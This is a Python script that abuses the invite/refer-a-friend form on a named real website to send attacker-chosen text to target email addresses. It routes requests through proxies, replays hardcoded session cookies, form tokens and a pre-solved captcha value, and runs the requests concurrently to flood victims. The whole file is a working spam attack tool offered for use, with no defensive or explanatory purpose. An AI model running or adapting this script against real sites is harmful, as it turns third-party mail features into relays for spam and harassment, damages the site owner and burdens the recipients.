import requests

import module

url = 'https://ongineering.com/en/more-3/index.php'

cookies = {
    '5f7cceb4af24e5c0eb756c8de090ef1a': '684bbc184cda8b7d105613ec20adf68f',
    'PHPSESSID': '9307984776cbc6ddc11e4fb64dbfe1dd',
}

headers = {
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
}

params = {
    'option': 'com_inviterefer',
    'view': 'inviterefer',
    'Itemid': '1008',
}


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response:


        text = self.get_text()
        data = [
            ('08e96bd0edee5e41b42df7a5bb4b5a80', '1'),
            ('option', 'com_inviterefer'),
            ('task', 'send'),
            ('recommend_from_name', text),
            ('recommend_from_email', target),
            ('recommend_to_name0', text),
            ('recommend_to_email0', target),
            ('recommend_to_name1', text),
            ('recommend_to_email1', target),
            ('recommend_to_name2', text),
            ('recommend_to_email2', target),
            ('recommend_to_name3', text),
            ('recommend_to_email3', target),
            ('recommend_text', text),
            ('dm_ccuser', '1'),
            ('security_code', 'qnkb3'),
            ('Submit', 'Send Invitation'),
            ('recommend_option', 'send'),
            ('scode', 'cW5rYjM='),
            ('scode2', ''),
            ('08e96bd0edee5e41b42df7a5bb4b5a80', '1'),
        ]

        response = requests.post(url, params=params, cookies=cookies, headers=headers, data=data, proxies=self.get_proxies())
        return response


if __name__ == '__main__':
    project_name = 'ongineering'
    success_message = 'Thank'

    spam = ConcreteSpam(project_name, success_message)
    res = spam.send_post()  # 3gBKP1z mixru
    if res:
        spam.run_concurrently()
